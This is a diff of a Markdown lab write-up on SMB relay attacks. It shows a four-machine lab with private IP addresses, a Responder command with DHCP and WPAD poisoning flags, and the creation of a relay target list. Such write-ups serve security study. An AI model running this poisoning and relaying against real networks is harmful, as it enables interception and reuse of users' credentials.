@@ -20,17 +20,19 @@
 - [Result](#result)
 - [Prevention](#prevention)
 
-## Introduction
+# Introduction
 
 SMB Relay is a network attack where an attacker captures a user's authentication request and forwards it to victim machine instead of cracking the password. If the target system accepts the authentication, the attacker can gain access using the victim's session.
 
 # Lab Setup
-```
-| Machine  | Operating System                 | Role           |
-| -------- | -------------------------------- | -------------- |
-| Attacker | Kali Linux                       | Attack machine |
-| Victim   | Windows 10                       | User machine   |
-| Target   | Windows Server / Windows Machine | Target machine |
+``
+|    Machine         |      OS       |               Role                   |      Ip       |
+| ------------------ |------------------------------------------------------|---------------|
+| Attacker           | Kali Linux    | Attack machine                       | 192.168.5.128 |
+| Victim             | Windows 10    | Victim machine(Authentication Source)| 192.168.5.135 |
+| Windows Server / DC| Windows Server| Domain Controller / Protected Target | 192.168.5.134 |
+| Target             | Windows 10    | Relay Target (Vulnerable Host)       | 192.168.5.136 |
+
 ```
 
 # Attack Flow
@@ -122,3 +124,45 @@ ENTER
 </p>
 
 # Step 2: Start Responder
+
+- Run:
+```bash
+sudo responder -I eth0 -dwv
+```
+```
+|    Flag   |     Meaning       |
+|-----------|-------------------|
+| -I eth0   | Network interface |
+|    -d     | DHCP poisoning    |
+|    -w     | WPAD proxy server |
+|    -v     | Verbose mode      |
+```
+
+# Step 3: Create Target List
+
+- Create a file for target IP addresses:
+
+```bash
+nano targets.txt
+```
+<p align="center">
+  <img src="/writeups/02-smb-relay/images/step2-1.png" width="600">
+</p>
+
+- Add Targets:
+
+```bash
+192.168.5.134
+192.168.5.135
+```
+<p align="center">
+  <img src="/writeups/02-smb-relay/images/step2-2.png" width="600">
+</p>
+
+- Save and exit:
+
+```bash
+CTRL + X
+Y
+ENTER
+```
